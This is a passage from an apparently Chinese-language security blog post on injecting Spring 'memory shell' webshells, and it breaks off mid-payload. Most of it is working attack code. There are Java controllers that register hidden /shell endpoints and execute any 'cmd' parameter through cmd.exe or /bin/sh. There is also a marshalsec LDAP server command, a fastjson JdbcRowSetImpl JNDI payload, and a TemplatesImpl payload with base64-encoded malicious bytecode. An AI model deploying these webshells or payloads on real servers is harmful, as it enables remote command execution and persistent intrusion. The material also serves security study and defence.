InjectController();</span><br><span class=\"line\">        mappingHandlerMapping.registerMapping(info,injectToController,method);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;[+]success: /shell&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InjectController</span></span>&#123;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">InjectController</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">test</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">//获取request</span></span><br><span class=\"line\">            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class=\"line\">            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class=\"line\">            PrintWriter writer = response.getWriter();</span><br><span class=\"line\">            <span class=\"comment\">//cmd参数</span></span><br><span class=\"line\">            String cmd = request.getParameter(<span class=\"string\">&quot;cmd&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                String o = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">                ProcessBuilder p;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toLowerCase().contains(<span class=\"string\">&quot;win&quot;</span>)) &#123;</span><br><span class=\"line\">                    p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Scanner c = (<span class=\"keyword\">new</span> Scanner(p.start().getInputStream())).useDelimiter(<span class=\"string\">&quot;\\\\\\\\A&quot;</span>);</span><br><span class=\"line\">                o = c.hasNext() ? c.next() : o;</span><br><span class=\"line\">                c.close();</span><br><span class=\"line\">                writer.write(o);</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">                writer.close();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                response.sendError(<span class=\"number\">404</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Controller;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.BufferedReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStreamReader;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ShellController</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(value = &quot;/inject&quot;, method = RequestMethod.GET)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">inject</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> NoSuchMethodException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1. 利用spring内部方法获取context</span></span><br><span class=\"line\">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class=\"string\">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 2. 从context中获得 RequestMappingHandlerMapping 的实例</span></span><br><span class=\"line\">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 3. 通过反射获得自定义 controller 中的 Method 对象</span></span><br><span class=\"line\">        Method method = InjectToController.class.getMethod(<span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 4. 定义访问 controller 的 URL 地址</span></span><br><span class=\"line\">        PatternsRequestCondition url = <span class=\"keyword\">new</span> PatternsRequestCondition(<span class=\"string\">&quot;/demo&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 5. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span><br><span class=\"line\">        RequestMethodsRequestCondition ms = <span class=\"keyword\">new</span> RequestMethodsRequestCondition();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 6. 在内存中动态注册 controller</span></span><br><span class=\"line\">        RequestMappingInfo info = <span class=\"keyword\">new</span> RequestMappingInfo(url, ms, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        InjectToController injectToController = <span class=\"keyword\">new</span> InjectToController();</span><br><span class=\"line\">        mappingHandlerMapping.registerMapping(info, injectToController, method);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InjectToController</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">InjectToController</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">test</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 获取request</span></span><br><span class=\"line\">            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class=\"line\"></span><br><span class=\"line\">            InputStream is = Runtime.getRuntime().exec(request.getParameter(<span class=\"string\">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class=\"line\">            InputStreamReader isr = <span class=\"keyword\">new</span> InputStreamReader(is, <span class=\"string\">&quot;GBK&quot;</span>);</span><br><span class=\"line\">            BufferedReader br = <span class=\"keyword\">new</span> BufferedReader(isr);</span><br><span class=\"line\">            String str = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">            String line = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">while</span> ((line = br.readLine())!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">                str+=line;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            is.close();</span><br><span class=\"line\">            br.close();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> str;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220606235323859.png\" alt=\"image-20220606235323859\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220607010606558.png\" alt=\"image-20220607010606558\"></p>\n<p>其中的注意点：</p>\n<p>1、springboot 2.6.0后有个新特性，添加了 pathPatternsCondition 导致 手动注册controller报错</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Expected lookupPath in request attribute &quot;org.springframework.web.util.UrlPathHelper.PATH&quot;</span><br></pre></td></tr></table></figure>\n\n<p>2、关于注册controller</p>\n<p>还有好几种的接口可以实现调用register方法进行添加 registry，参见 <a href=\"https://www.anquanke.com/post/id/198886#h3-8\">基于内存 Webshell 的无文件攻击技术研究</a></p>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>利用场景可将其转为jsp文件，或通过反序列化来注入内存马比如fastjson，CC链</p>\n<p>加入fastjson 1.2.24</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;1.2.24&lt;&#x2F;version&gt;</span><br><span class=\"line\">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>\n\n<p>JsonController</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Controller;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JsonController</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@ResponseBody</span></span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(value = &quot;/fastjson&quot;, method = RequestMethod.POST)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">test01</span><span class=\"params\">(<span class=\"meta\">@RequestBody</span> String payload)</span></span>&#123;</span><br><span class=\"line\">        Object object = JSON.parse(payload);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> object.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"出网情况\"><a href=\"#出网情况\" class=\"headerlink\" title=\"出网情况\"></a>出网情况</h3><p>利用 ldap或 rmi</p>\n<p>JndiController.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JndiController</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">JndiController</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> NoSuchMethodException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1. 利用spring内部方法获取context</span></span><br><span class=\"line\">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class=\"string\">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 2. 从context中获取 RequestMappingHandlerMapping实例</span></span><br><span class=\"line\">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class=\"line\">        <span class=\"comment\">// 3. 反射获取InjectController的method</span></span><br><span class=\"line\">        Method method = JndiController.class.getMethod(<span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 4. 定义访问 controller 的 URL 地址</span></span><br><span class=\"line\">        PatternsRequestCondition url = <span class=\"keyword\">new</span> PatternsRequestCondition(<span class=\"string\">&quot;/shell&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 5. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span><br><span class=\"line\">        RequestMethodsRequestCondition ms = <span class=\"keyword\">new</span> RequestMethodsRequestCondition();</span><br><span class=\"line\">        <span class=\"comment\">// 6. 在内存中动态注册 controller</span></span><br><span class=\"line\">        RequestMappingInfo info = <span class=\"keyword\">new</span> RequestMappingInfo(url, ms, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        JndiController injectToController = <span class=\"keyword\">new</span> JndiController(<span class=\"string\">&quot;xxx&quot;</span>);</span><br><span class=\"line\">        mappingHandlerMapping.registerMapping(info,injectToController,method);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">JndiController</span><span class=\"params\">(String tmp)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">test</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 获取request</span></span><br><span class=\"line\">        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class=\"line\"></span><br><span class=\"line\">        InputStream is = Runtime.getRuntime().exec(request.getParameter(<span class=\"string\">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class=\"line\">        InputStreamReader isr = <span class=\"keyword\">new</span> InputStreamReader(is, <span class=\"string\">&quot;GBK&quot;</span>);</span><br><span class=\"line\">        BufferedReader br = <span class=\"keyword\">new</span> BufferedReader(isr);</span><br><span class=\"line\">        String str = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        String line = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> ((line = br.readLine())!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            str+=line;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        is.close();</span><br><span class=\"line\">        br.close();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> str;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译为class文件后，利用marashalsec起一个ldap，将恶意class文件所在目录利用python起一个http-server</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;#JndiController</span><br></pre></td></tr></table></figure>\n\n<p>fastjson触发jndi注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;test&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>\n\n<p>获取恶意class成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220608195422042.png\" alt=\"image-20220608195422042\"></p>\n<p>成功注入</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/image-20220608195602979.png\" alt=\"image-20220608195602979\"></p>\n<h3 id=\"不出网\"><a href=\"#不出网\" class=\"headerlink\" title=\"不出网\"></a>不出网</h3><p>fastjson反序列化利用 TemplatesImpl 链</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Scanner;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">poc_1</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractTranslet</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">poc_1</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> IOException, NoSuchMethodException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class=\"string\">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class=\"line\">        Method method = poc_1.class.getMethod(<span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">        PatternsRequestCondition url = <span class=\"keyword\">new</span> PatternsRequestCondition(<span class=\"string\">&quot;/shell&quot;</span>);</span><br><span class=\"line\">        RequestMethodsRequestCondition ms = <span class=\"keyword\">new</span> RequestMethodsRequestCondition();</span><br><span class=\"line\">        RequestMappingInfo info = <span class=\"keyword\">new</span> RequestMappingInfo(url, ms, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        poc_1 injectToController = <span class=\"keyword\">new</span> poc_1(<span class=\"string\">&quot;xxx&quot;</span>);</span><br><span class=\"line\">        mappingHandlerMapping.registerMapping(info,injectToController,method);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">poc_1</span><span class=\"params\">(String tmp)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">test</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class=\"line\">        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class=\"line\">        PrintWriter writer = response.getWriter();</span><br><span class=\"line\">        String cmd = request.getParameter(<span class=\"string\">&quot;cmd&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">            String o = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">            ProcessBuilder p;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toLowerCase().contains(<span class=\"string\">&quot;win&quot;</span>)) &#123;</span><br><span class=\"line\">                p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                p = <span class=\"keyword\">new</span> ProcessBuilder(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            Scanner c = (<span class=\"keyword\">new</span> Scanner(p.start().getInputStream())).useDelimiter(<span class=\"string\">&quot;\\\\\\\\A&quot;</span>);</span><br><span class=\"line\">            o = c.hasNext() ? c.next() : o;</span><br><span class=\"line\">            c.close();</span><br><span class=\"line\">            writer.write(o);</span><br><span class=\"line\">            writer.flush();</span><br><span class=\"line\">            writer.close();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            response.sendError(<span class=\"number\">404</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, SerializationHandler[] handlers)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        poc_1 t = <span class=\"keyword\">new</span> poc_1();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译为class文件后，base64编码放到 <strong>_bytecodes</strong> 中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQA7QoAOQCACgCBAIIIAIMLAIQAhQcAhgcAhwsABQCIBwCJCABVBwCKCgAKAIsHAIwHAI0IAI4KAAwAjwcAkAcAkQoAEACSBwCTCgATAJQIAJUKAAgAlgoABgCXBwCYCgAYAJkKABgAmgsAmwCcCABjCwCdAJ4IAJ8IAKAKAKEAogoADQCjCACkCgANAKUHAKYIAKcIAKgKACQAjwgAqQgAqgcAqwoAJACsCgCtAK4KACoArwgAsAoAKgCxCgAqALIKACoAswoAKgC0CgC1ALYKALUAtwoAtQC0BwC4CwCbALkKAAgAgAcAugEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAHTHBvY18xOwEAB2NvbnRleHQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7AQAVbWFwcGluZ0hhbmRsZXJNYXBwaW5nAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmc7AQAGbWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAN1cmwBAEhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjsBAAJtcwEATkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uOwEABGluZm8BAD9Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBABJpbmplY3RUb0NvbnRyb2xsZXIBAApFeGNlcHRpb25zBwC7BwC8AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQADdG1wAQASTGphdmEvbGFuZy9TdHJpbmc7AQAQTWV0aG9kUGFyYW1ldGVycwEABHRlc3QBAAFwAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAFvAQABYwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEABndyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAIkHAL0HAL4HAL8HAI0HAKYHAKsHALgBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu